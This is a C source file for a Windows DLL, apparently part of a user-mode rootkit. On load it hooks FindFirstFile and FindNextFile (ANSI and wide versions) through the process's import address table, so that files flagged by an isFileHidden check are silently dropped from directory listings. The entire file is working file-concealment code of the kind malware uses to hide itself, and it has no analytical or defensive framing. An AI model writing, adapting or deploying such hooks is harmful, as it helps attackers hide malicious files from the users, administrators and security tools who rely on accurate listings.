#include "fileHiderMain.h"

#define NUM_OF_FUNCS_TO_HOOK_HIDER (4)
#define FIND_FIRST_FILE_A (0)
#define FIND_FIRST_FILE_W (1)
#define FIND_NEXT_FILE_A (2)
#define FIND_NEXT_FILE_W (3)

typedef HANDLE(*findFirstFileAPtr)(LPCSTR, LPWIN32_FIND_DATAA);
typedef HANDLE(*findFirstFileWPtr)(LPCWSTR, LPWIN32_FIND_DATAW);

typedef BOOL(*findNextFileAPtr)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL(*findNextFileWPtr)(HANDLE, LPWIN32_FIND_DATAW);

HookData g_funcsToHookHider[NUM_OF_FUNCS_TO_HOOK_HIDER];
static BOOL isHiderFuncsToHookInit = FALSE;
static BOOL isHiderFuncsHooksSet = FALSE;

HANDLE
WINAPI
myFindFirstFileA(
	_In_  LPCSTR           lpFileName,
	_Out_ LPWIN32_FIND_DATAA lpFindFileData) {
	debugOutput(L"In myFindFirstFileA");
	HANDLE ret = ((findFirstFileAPtr)g_funcsToHookHider[FIND_FIRST_FILE_A].origFuncPtr)(lpFileName, lpFindFileData);
	if (isFileHiddenA(lpFindFileData->cFileName)) {
		myFindNextFileA(ret, lpFindFileData);
	}
	return ret;
}

HANDLE
WINAPI
myFindFirstFileW(
	_In_ LPCWSTR lpFileName,
	_Out_ LPWIN32_FIND_DATAW lpFindFileData) {
	debugOutput(L"In myFindFirstFileW");
	HANDLE ret = ((findFirstFileWPtr)g_funcsToHookHider[FIND_FIRST_FILE_W].origFuncPtr)(lpFileName, lpFindFileData);
	if (isFileHiddenW(lpFindFileData->cFileName)) {
		myFindNextFileW(ret, lpFindFileData);
	}
	return ret;
}

BOOL
WINAPI
myFindNextFileA(
	_In_ HANDLE hFindFile,
	_Out_ LPWIN32_FIND_DATAA lpFindFileData
) {
	debugOutput(L"In myFindNextFileA");
	BOOL ret = ((findNextFileAPtr)g_funcsToHookHider[FIND_NEXT_FILE_A].origFuncPtr)(hFindFile, lpFindFileData);
	if (ret && isFileHiddenA(lpFindFileData->cFileName)) {
		return myFindNextFileA(hFindFile, lpFindFileData);
	}
	return ret;
}

BOOL
WINAPI
myFindNextFileW(
	_In_ HANDLE hFindFile,
	_Out_ LPWIN32_FIND_DATAW lpFindFileData) {
	BOOL ret = ((findNextFileWPtr)g_funcsToHookHider[FIND_NEXT_FILE_W].origFuncPtr)(hFindFile, lpFindFileData);
	if (ret && isFileHiddenW(lpFindFileData->cFileName)) {
		return myFindNextFileW(hFindFile, lpFindFileData);
	}
	return ret;
}

BOOL initFuncsToHook(HMODULE hModule) {
	// Making sure the global g_funcsToHookHider wouldn't be initialized more than one time
	// as it contains the isHookSet indicator
	if (!isHiderFuncsToHookInit) {
		LPVOID baseIATAddr = getIATAddr(hModule);
		if (NULL == baseIATAddr) {
			debugOutputNum(L"HookerDLL: Error in DllMain, failed to get image import descriptor (0x%08lx)\n", GetLastError());
			return FALSE;
		}

		HookData _findFirstFileA = { myFindFirstFileA, FindFirstFileA, NULL, "FindFirstFileA", baseIATAddr, FALSE };
		HookData _findFirstFileW = { myFindFirstFileW, FindFirstFileW, NULL, "FindFirstFileW", baseIATAddr, FALSE };
		HookData _findNextFileA = { myFindNextFileA, FindNextFileA, NULL, "FindNextFileA", baseIATAddr, FALSE };
		HookData _findNextFileW = { myFindNextFileW, FindNextFileW, NULL, "FindNextFileW", baseIATAddr, FALSE };

		g_funcsToHookHider[FIND_FIRST_FILE_A] = _findFirstFileA;
		g_funcsToHookHider[FIND_FIRST_FILE_W] = _findFirstFileW;
		g_funcsToHookHider[FIND_NEXT_FILE_A] = _findNextFileA;
		g_funcsToHookHider[FIND_NEXT_FILE_W] = _findNextFileW;

		isHiderFuncsToHookInit = TRUE;
	}
	return TRUE;
}

DWORD procId = -1;
TCHAR szFileName[MAX_PATH] = { 0 };
static BOOL isDataInit = FALSE;
BOOL initProcData() {
	if (!isDataInit) {
		isDataInit = TRUE;
		procId = GetCurrentProcessId();
		return 0 < GetModuleFileNameW(NULL, szFileName, MAX_PATH);
	}
	return TRUE;
}

BOOL WINAPI DllMain(
	__in HINSTANCE  hInstance,
	__in DWORD      reason,
	__in LPVOID     reserved) {
	HMODULE hModule = GetModuleHandleA(NULL);
	if (!initProcData() || !initFuncsToHook(hModule)) {
		return FALSE;
	}

	switch (reason) {
	case DLL_PROCESS_ATTACH:
		if (!isHiderFuncsHooksSet) {
			isHiderFuncsHooksSet = TRUE;
			hookMultipleFuncs(g_funcsToHookHider, hModule, NUM_OF_FUNCS_TO_HOOK_HIDER);
		}
		break;
	}
	return TRUE;
}